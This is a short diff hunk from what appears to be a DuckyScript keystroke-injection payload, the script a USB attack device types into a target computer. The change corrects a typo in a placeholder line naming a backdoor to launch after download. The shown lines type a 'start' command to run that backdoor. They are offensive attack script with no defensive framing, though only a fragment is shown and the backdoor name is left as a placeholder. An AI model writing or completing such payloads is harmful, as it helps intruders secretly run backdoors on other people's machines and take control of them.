@@ -33,7 +33,7 @@ DELAY 5000
 STRING START 
 DELAY 200
 SPACE
-STRING               <Here Is The Name Backdoor Ao Start After Download
+STRING               <Here Is The Name Backdoor To Start After Download
 DELAY 100
 ENTER
 
